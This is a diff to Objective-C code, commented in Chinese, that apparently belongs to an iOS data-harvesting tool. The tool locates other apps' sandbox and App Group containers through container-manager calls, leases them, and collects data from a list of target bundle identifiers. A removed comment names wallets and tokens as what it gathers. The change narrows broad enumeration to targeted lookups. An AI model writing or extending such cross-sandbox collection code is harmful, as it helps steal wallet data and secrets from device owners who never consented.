@@ -141,33 +141,41 @@ static NSArray<NSDictionary *> *OWTargets(void) {
           [OWMCMLease shared].available ? @"可用" : @"不可用",
           (unsigned long)[OWMCMLease shared].maxConcurrent);
 
-    NSUInteger lsCount = [[OWLaunchServices shared] load];
-    OWLog(@"B: LS 映射 %lu 条（%@）", (unsigned long)lsCount, [OWLaunchServices shared].status);
-
     NSMutableDictionary<NSString *, NSString *> *found = [NSMutableDictionary new];
+    NSArray<NSDictionary *> *targets = OWTargets();
+    OWLog(@"B: 目标 %lu 个（MHA 定向模式，不做枚举）", (unsigned long)targets.count);
 
-    // 主类别：App Data（class 2）+ App Group（class 7，备忘录/共享库）
-    [self _enumerateClass:OWMCMClassApplicationData into:found];
-    [self _enumerateClass:OWMCMClassAppGroup into:found];
+    // MHA 路线只支持「一个 identifier 一次查询」，所以直接按 targets 定向。
+    for (NSDictionary *t in targets) {
+        NSString *name = t[@"name"] ?: t[@"bundleId"];
+        NSString *bid = t[@"bundleId"];
+        if (!bid.length) continue;
 
-    // 次级类别：部分钱包把数据放在 extension / service / system 容器里。
-    // 只在命中 targets 时才采集，token 有就采、没有就跳过，不阻塞主流程。
-    NSArray<NSNumber *> *secondary = @[
-        @(OWMCMClassExtensionData),
-        @(OWMCMClassServiceData),
-        @(OWMCMClassSystemData),
-        @(OWMCMClassProtectedData),
-        @(OWMCMClassVPNData),
-        @(OWMCMClassScopedPart),
-    ];
-    for (NSNumber *n in secondary) {
-        [self _enumerateClass:(OWMCMClass)n.unsignedLongLongValue into:found];
+        OWMCMClass cls = [bid hasPrefix:@"group."] ? OWMCMClassAppGroup
+                                                   : OWMCMClassApplicationData;
+        OWMCMContainer *c = [[OWMCM shared] containerOfClass:cls identifier:bid error:nil];
+        if (!c) {
+            OWMCMClass alt = (cls == OWMCMClassAppGroup) ? OWMCMClassApplicationData
+                                                         : OWMCMClassAppGroup;
+            c = [[OWMCM shared] containerOfClass:alt identifier:bid error:nil];
+            if (c) cls = alt;
+        }
+        if (!c || !c.path.length) {
+            OWLog(@"B: %@ (%@) 未找到容器", name, bid);
+            continue;
+        }
+        found[bid] = c.path;
+
+        NSString *reason = nil;
+        if (![[OWMCMLease shared] activateContainer:c reason:&reason]) {
+            OWLog(@"B: %@ lease 失败 (%@)", name, reason ?: @"?");
+            continue;
+        }
+        [self _collectTarget:t containerPath:c.path];
+        [[OWMCMLease shared] releasePath:c.path];
     }
 
     [self _writeContainerMap:found];
-
-    // pass2：清单里未命中的定向再取
-    [self _targetedPassInto:found];
 
     [[OWMCMLease shared] releaseAll];
 
